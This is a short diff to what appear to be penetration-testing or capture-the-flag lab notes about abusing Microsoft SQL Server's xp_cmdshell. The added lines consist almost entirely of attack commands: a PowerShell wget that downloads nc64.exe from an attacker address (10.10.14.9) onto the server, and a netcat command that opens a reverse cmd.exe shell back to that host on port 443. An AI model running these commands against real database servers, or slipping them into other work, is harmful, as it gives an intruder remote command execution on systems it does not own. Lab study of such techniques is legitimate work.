@@ -20,3 +20,11 @@ what also works:
 ```bash
 xp_cmdshell 'whoami'
 ```
+upload reverseshell script:
+```bash
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.9/nc64.exe -outfile nc64.exe"
+```
+run reverseshell script:
+```bash
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.9 443"
+```
